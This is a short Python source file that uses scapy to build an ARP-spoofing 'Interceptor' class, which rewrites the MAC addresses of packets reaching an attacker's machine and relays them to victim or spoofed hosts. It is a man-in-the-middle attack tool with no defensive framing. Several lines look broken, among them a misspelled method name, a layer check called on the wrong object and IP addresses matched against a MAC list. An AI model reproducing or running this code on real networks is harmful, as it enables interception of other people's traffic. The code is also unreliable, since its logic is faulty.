from scapy.all import *
from scapy.layers.inet import IP

class Interceptor():
	pkt = Ether()/ARP()
	macAttacker = ""
	ipToSpoof = ""
	macSpoof = ""
	macVictim = ""
	networkID = ""
	silentMode = False

	def __init__(self, pkt, macAttacker, ipToSpoof, macSpoof, macVictim, networkID, silentMode):
		self.pkt = pkt
		self.macAttacker = macAttacker
		self.ipToSpoof = ipToSpoof
		self.macSpoof = macSpoof
		self.macVictim = macVictim
		self.networkID = networkID
		self.silentMode = silentMode

	def interceltARP(self):
		if self.pkt[Ether].dst == self.macAttacker:
			if self.haslayer(IP):
				if self.pkt[IP].dst in self.macSpoof:
					self.pkt[Ether].dst = self.macSpoof[self.ipToSpoof.index(self.pkt[IP].dst)]
				else:
					self.pkt[Ether].dst = self.macVictim
			
			self.pkt[Ether].src = self.macAttacker
			
			if self.silentMode:
				sendp(self.pkt, iface = self.networkID, verbose = 0)
